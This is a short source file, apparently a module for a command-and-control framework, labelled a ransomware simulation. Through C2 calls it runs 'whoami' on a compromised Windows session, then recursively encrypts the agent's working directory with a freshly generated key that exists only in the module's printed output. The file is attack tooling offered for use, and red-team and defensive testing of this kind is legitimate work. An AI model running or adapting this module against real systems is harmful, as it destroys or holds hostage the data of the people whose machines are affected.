// Ransomware simulation: recursively encrypt the agent's working directory
// on a Windows target. A fresh key is generated for every run. Capture it
// from this module's output; it is the only copy.
// Recovery: run decrypt_all_windows with the key and "." as arguments.
fn run(session_id) {
    print("Encrypting working directory for session " + session_id);
    send_c2_command(session_id, "shell whoami");
    let key = random_hex_key();
    print("Encryption key for this run: " + key);
    let res = send_c2_extension(session_id, "recursive_lock", [".", key]);
    return "Deployed: " + res;
}
